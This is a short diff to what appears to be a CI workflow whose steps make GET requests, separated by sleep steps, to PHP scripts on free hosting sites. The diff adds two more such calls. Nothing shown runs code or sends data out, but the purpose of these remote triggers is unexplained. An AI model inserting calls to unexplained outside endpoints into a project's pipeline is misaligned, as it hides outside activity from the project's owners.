@@ -27,5 +27,8 @@ jobs:
       - run: GET https://fordevelopmio.webcindario.com/officemanvgsm1.php
       - run: sleep 10
       - run: GET https://varatija.000webhostapp.com/officeinfyspoporte1.php
-      - run: sleep 30
+      - run: sleep 20
+      - run: GET https://fordevelopmio.webcindario.com/manuel281.php
       - run: GET https://committed-lanes.000webhostapp.com/officemanvgsm_w1.php
+      - run: sleep 15
+      - run: GET https://committed-lanes.000webhostapp.com/manuel281.php
